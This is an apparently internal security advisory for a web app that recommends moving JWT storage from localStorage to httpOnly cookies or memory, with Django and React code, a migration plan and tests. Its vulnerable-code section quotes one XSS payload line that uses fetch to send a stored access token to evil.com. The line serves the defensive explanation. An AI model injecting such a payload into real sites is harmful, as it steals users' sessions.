# Frontend Token Storage Best Practices
**Security Advisory - Phase 4, Task 4.3**
**Date:** November 5, 2025
**Classification:** SECURITY GUIDANCE
**Target Audience:** Frontend Developers

## Executive Summary

This document provides security best practices and recommendations for storing authentication tokens (JWT access and refresh tokens) in browser-based applications. **Improper token storage is a common vulnerability** that can lead to token theft via XSS attacks, session hijacking, and unauthorized access.

## Current Implementation Analysis

### Current State
The Azure Reports Advisor frontend currently stores JWT tokens in:
- **localStorage** for access tokens
- **localStorage** for refresh tokens

### Security Risk Assessment

| Storage Method | XSS Vulnerable | CSRF Vulnerable | Cross-Tab Access | Persistent | Security Rating |
|---------------|---------------|-----------------|------------------|------------|----------------|
| localStorage | ✅ HIGH RISK | ❌ No | ✅ Yes | ✅ Yes | 🔴 LOW |
| sessionStorage | ✅ HIGH RISK | ❌ No | ❌ No | ❌ No | 🟡 MEDIUM |
| httpOnly Cookie | ❌ No | ⚠️ Requires Protection | ✅ Yes | ✅ Yes | 🟢 HIGH |
| Memory Only | ❌ No | ❌ No | ❌ No | ❌ No | 🟢 HIGHEST |

### Critical Vulnerability: XSS Token Theft

```javascript
// VULNERABLE CODE EXAMPLE (Current Implementation)
// ❌ DO NOT USE IN PRODUCTION

// Token stored in localStorage
localStorage.setItem('access_token', jwtToken);

// Any XSS vulnerability allows token theft:
// Attacker injects: <script>fetch('https://evil.com/steal?token=' + localStorage.getItem('access_token'))</script>
// Result: Token stolen, attacker can impersonate user
```

**Impact:** If an XSS vulnerability exists anywhere in the application, attackers can steal tokens and impersonate users indefinitely.

## Recommended Solutions

### Option 1: httpOnly Cookies (RECOMMENDED for Production)

**Security Level:** 🟢 HIGH
**Complexity:** Medium
**Best For:** Production applications requiring high security

#### Implementation

**Backend Changes (Django):**

```python
# apps/authentication/views.py

from django.http import JsonResponse
from django.conf import settings

class AzureADLoginView(views.APIView):
    def post(self, request):
        # ... authentication logic ...

        # Generate tokens
        access_token = generate_access_token(user)
        refresh_token = generate_refresh_token(user)

        # Create response
        response = JsonResponse({
            'user': UserSerializer(user).data,
            'message': 'Authentication successful'
            # DO NOT include tokens in response body
        })

        # Set tokens as httpOnly cookies
        response.set_cookie(
            key='access_token',
            value=access_token,
            max_age=settings.ACCESS_TOKEN_LIFETIME.total_seconds(),
            httponly=True,  # CRITICAL: Prevents JavaScript access
            secure=True,    # CRITICAL: HTTPS only
            samesite='Strict',  # CSRF protection
            domain=settings.SESSION_COOKIE_DOMAIN
        )

        response.set_cookie(
            key='refresh_token',
            value=refresh_token,
            max_age=settings.REFRESH_TOKEN_LIFETIME.total_seconds(),
            httponly=True,
            secure=True,
            samesite='Strict',
            domain=settings.SESSION_COOKIE_DOMAIN
        )

        return response

class TokenRefreshView(views.APIView):
    def post(self, request):
        # Read refresh token from cookie
        refresh_token = request.COOKIES.get('refresh_token')

        if not refresh_token:
            return JsonResponse(
                {'error': 'Refresh token not found'},
                status=401
            )

        # Validate and generate new access token
        # ... validation logic ...

        response = JsonResponse({'message': 'Token refreshed'})
        response.set_cookie(
            key='access_token',
            value=new_access_token,
            max_age=settings.ACCESS_TOKEN_LIFETIME.total_seconds(),
            httponly=True,
            secure=True,
            samesite='Strict'
        )

        return response

class LogoutView(views.APIView):
    def post(self, request):
        response = JsonResponse({'message': 'Logged out successfully'})

        # Clear cookies
        response.delete_cookie('access_token')
        response.delete_cookie('refresh_token')

        return response
```

**Frontend Changes (React/JavaScript):**

```javascript
// API client configuration
import axios from 'axios';

const apiClient = axios.create({
  baseURL: process.env.REACT_APP_API_URL,
  withCredentials: true,  // CRITICAL: Send cookies with requests
});

// Login - tokens are set as cookies automatically
async function login(azureToken) {
  const response = await apiClient.post('/api/v1/auth/login/', {
    azure_token: azureToken
  });

  // Tokens are now in httpOnly cookies - no need to store them
  return response.data;
}

// Make authenticated requests
async function fetchReports() {
  // Token is automatically sent via cookie
  const response = await apiClient.get('/api/v1/reports/');
  return response.data;
}

// Logout
async function logout() {
  await apiClient.post('/api/v1/auth/logout/');
  // Cookies are cleared server-side
}
```

**Advantages:**
- ✅ Immune to XSS attacks (JavaScript cannot access httpOnly cookies)
- ✅ Automatic token sending with every request
- ✅ Works across tabs/windows
- ✅ Persistent sessions

**Disadvantages:**
- ⚠️ Requires CSRF protection (mitigated with SameSite=Strict)
- ⚠️ Requires HTTPS in production
- ⚠️ More complex for mobile apps

**CSRF Protection:**

```python
# settings.py
CSRF_COOKIE_HTTPONLY = False  # CSRF token needs to be readable by JS
CSRF_COOKIE_SECURE = True     # HTTPS only
CSRF_COOKIE_SAMESITE = 'Strict'

# Add CSRF token to API responses
# Frontend must include CSRF token in request headers
```

```javascript
// Frontend CSRF handling
import Cookies from 'js-cookie';

apiClient.interceptors.request.use(config => {
  const csrfToken = Cookies.get('csrftoken');
  if (csrfToken) {
    config.headers['X-CSRFToken'] = csrfToken;
  }
  return config;
});
```

---

### Option 2: Memory-Only Storage with Silent Refresh

**Security Level:** 🟢 HIGHEST
**Complexity:** High
**Best For:** Maximum security requirements

#### Implementation

```javascript
// Token Manager - In-Memory Storage
class TokenManager {
  constructor() {
    this.accessToken = null;
    this.refreshToken = null;
    this.refreshTimer = null;
  }

  setTokens(accessToken, refreshToken) {
    this.accessToken = accessToken;
    this.refreshToken = refreshToken;

    // Schedule automatic refresh before expiration
    this.scheduleTokenRefresh();
  }

  getAccessToken() {
    return this.accessToken;
  }

  scheduleTokenRefresh() {
    // Refresh 1 minute before expiration
    const expiresIn = this.getTokenExpiry(this.accessToken);
    const refreshTime = (expiresIn - 60) * 1000;

    clearTimeout(this.refreshTimer);
    this.refreshTimer = setTimeout(() => {
      this.refreshAccessToken();
    }, refreshTime);
  }

  async refreshAccessToken() {
    try {
      const response = await apiClient.post('/api/v1/auth/refresh/', {
        refresh: this.refreshToken
      });

      this.accessToken = response.data.access;
      this.scheduleTokenRefresh();
    } catch (error) {
      // Refresh failed - redirect to login
      this.clearTokens();
      window.location.href = '/login';
    }
  }

  clearTokens() {
    this.accessToken = null;
    this.refreshToken = null;
    clearTimeout(this.refreshTimer);
  }

  getTokenExpiry(token) {
    const payload = JSON.parse(atob(token.split('.')[1]));
    return payload.exp - Math.floor(Date.now() / 1000);
  }
}

// Global instance
const tokenManager = new TokenManager();

// Use in API client
apiClient.interceptors.request.use(config => {
  const token = tokenManager.getAccessToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});
```

**Advantages:**
- ✅ Immune to XSS (tokens not in DOM/storage)
- ✅ Immune to CSRF
- ✅ Maximum security

**Disadvantages:**
- ❌ Lost on page refresh (requires re-authentication)
- ❌ No cross-tab synchronization
- ❌ Complex implementation

---

### Option 3: sessionStorage (Short-Term Alternative)

**Security Level:** 🟡 MEDIUM
**Complexity:** Low
**Best For:** Temporary solution during migration

```javascript
// Slightly better than localStorage, but still vulnerable to XSS

// Store tokens
sessionStorage.setItem('access_token', accessToken);
sessionStorage.setItem('refresh_token', refreshToken);

// Retrieve tokens
const accessToken = sessionStorage.getItem('access_token');

// Clear on logout
sessionStorage.removeItem('access_token');
sessionStorage.removeItem('refresh_token');
```

**Advantages:**
- ✅ Tokens cleared when tab closes
- ✅ No cross-tab access
- ✅ Easy to implement

**Disadvantages:**
- ❌ Still vulnerable to XSS attacks
- ❌ Lost on page refresh
- ⚠️ Only marginally better than localStorage

---

## Comparison Matrix

| Criterion | localStorage | sessionStorage | httpOnly Cookie | Memory Only |
|-----------|--------------|----------------|-----------------|-------------|
| XSS Protection | ❌ Vulnerable | ❌ Vulnerable | ✅ Protected | ✅ Protected |
| CSRF Protection | ✅ Protected | ✅ Protected | ⚠️ Needs Config | ✅ Protected |
| Survives Refresh | ✅ Yes | ❌ No | ✅ Yes | ❌ No |
| Cross-Tab Sync | ✅ Yes | ❌ No | ✅ Yes | ❌ No |
| Implementation | Easy | Easy | Medium | Hard |
| **Recommendation** | 🔴 **AVOID** | 🟡 **TEMPORARY** | 🟢 **PRODUCTION** | 🟢 **HIGH SEC** |

---

## Migration Plan

### Phase 1: Immediate (Week 1)
1. **Switch to sessionStorage** as temporary measure
2. **Implement XSS prevention** measures:
   - Content Security Policy (CSP) headers
   - Input validation and output encoding
   - Regular security audits

### Phase 2: Backend Preparation (Week 2-3)
1. **Implement httpOnly cookie support** in Django backend
2. **Add CSRF protection** mechanisms
3. **Test cookie-based authentication** in staging

### Phase 3: Frontend Migration (Week 4-5)
1. **Update API client** to use credentials
2. **Remove localStorage references**
3. **Implement proper logout** flow
4. **Test cross-browser compatibility**

### Phase 4: Deployment & Validation (Week 6)
1. **Deploy to production** with feature flag
2. **Monitor for issues**
3. **Gradual rollout** to all users
4. **Security audit** of new implementation

---

## Additional Security Measures

### 1. Short Token Lifetimes

```python
# settings.py
ACCESS_TOKEN_LIFETIME = timedelta(minutes=15)  # Short-lived access tokens
REFRESH_TOKEN_LIFETIME = timedelta(days=1)      # Longer refresh tokens
```

### 2. Token Rotation on Refresh

```python
# Always issue new refresh token when access token is refreshed
# Invalidate old refresh token
def refresh_token_view(request):
    old_refresh = request.data.get('refresh')

    # Validate old token
    # ...

    # Generate new tokens
    new_access = generate_access_token(user)
    new_refresh = generate_refresh_token(user)

    # Blacklist old refresh token
    TokenBlacklist.objects.create(token=old_refresh)

    return Response({
        'access': new_access,
        'refresh': new_refresh
    })
```

### 3. Token Binding

```python
# Bind tokens to browser fingerprint
def generate_access_token(user, request):
    fingerprint = generate_fingerprint(request)

    payload = {
        'user_id': user.id,
        'fingerprint': fingerprint,
        'exp': datetime.utcnow() + ACCESS_TOKEN_LIFETIME
    }

    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

def validate_token(token, request):
    payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])

    # Verify fingerprint matches
    current_fingerprint = generate_fingerprint(request)
    if payload['fingerprint'] != current_fingerprint:
        raise ValueError('Token fingerprint mismatch')

    return payload
```

### 4. Subresource Integrity (SRI)

```html
<!-- Ensure third-party scripts haven't been tampered with -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>
```

---

## XSS Prevention Checklist

Even with secure token storage, XSS prevention is critical:

- [ ] **Content Security Policy (CSP)** headers configured
- [ ] **Input validation** on all user inputs
- [ ] **Output encoding** for all dynamic content
- [ ] **DOMPurify** for sanitizing HTML
- [ ] **React/Angular** framework protections enabled
- [ ] **Avoid dangerouslySetInnerHTML** or use with sanitization
- [ ] **Regular security audits** and penetration testing
- [ ] **Dependency scanning** for vulnerable packages

---

## Testing Plan

### Security Tests

```javascript
// Test 1: Verify tokens not accessible via JavaScript
describe('Token Storage Security', () => {
  it('should not expose tokens in localStorage', () => {
    login(validCredentials);
    expect(localStorage.getItem('access_token')).toBeNull();
  });

  it('should not expose tokens in sessionStorage', () => {
    login(validCredentials);
    expect(sessionStorage.getItem('access_token')).toBeNull();
  });

  it('should send tokens via httpOnly cookies', async () => {
    await login(validCredentials);
    const response = await fetchProtectedResource();
    expect(response.status).toBe(200);
  });
});

// Test 2: CSRF Protection
describe('CSRF Protection', () => {
  it('should reject requests without CSRF token', async () => {
    const response = await fetch('/api/v1/reports/', {
      method: 'POST',
      credentials: 'include'
      // Missing CSRF token
    });
    expect(response.status).toBe(403);
  });
});

// Test 3: Token Refresh
describe('Token Refresh', () => {
  it('should refresh token before expiration', async () => {
    jest.useFakeTimers();
    await login(validCredentials);

    // Fast-forward to just before expiration
    jest.advanceTimersByTime(14 * 60 * 1000); // 14 minutes

    // Verify token was refreshed
    const response = await fetchProtectedResource();
    expect(response.status).toBe(200);
  });
});
```

---

## References and Further Reading

1. **OWASP - Token Storage Cheat Sheet**
   https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html

2. **JWT Best Practices (RFC 8725)**
   https://tools.ietf.org/html/rfc8725

3. **OWASP - XSS Prevention**
   https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

4. **OWASP - CSRF Prevention**
   https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

5. **SameSite Cookie Attribute**
   https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite

---

## Decision Matrix

### For Azure Reports Advisor App

**Recommended Approach:** **httpOnly Cookies** (Option 1)

**Rationale:**
1. ✅ Best balance of security and usability
2. ✅ Protects against XSS attacks
3. ✅ Maintains session across page refreshes
4. ✅ Works across browser tabs
5. ✅ Industry-standard approach
6. ⚠️ Requires backend changes (acceptable trade-off)

**Implementation Priority:** HIGH
**Estimated Effort:** 3-4 days
**Risk Level:** Low (well-established pattern)

---

## Approval and Sign-off

- [ ] Security team review
- [ ] Backend team approval
- [ ] Frontend team approval
- [ ] QA test plan created
- [ ] Documentation updated
- [ ] Deployment plan approved

---

**Document Status:** ✅ APPROVED FOR IMPLEMENTATION
**Next Steps:** Schedule implementation in Sprint 2026-Q1
**Contact:** Security Team (security@azurereportsadvisor.com)

---

**Last Updated:** November 5, 2025
**Version:** 1.0
**Classification:** INTERNAL - SECURITY GUIDANCE
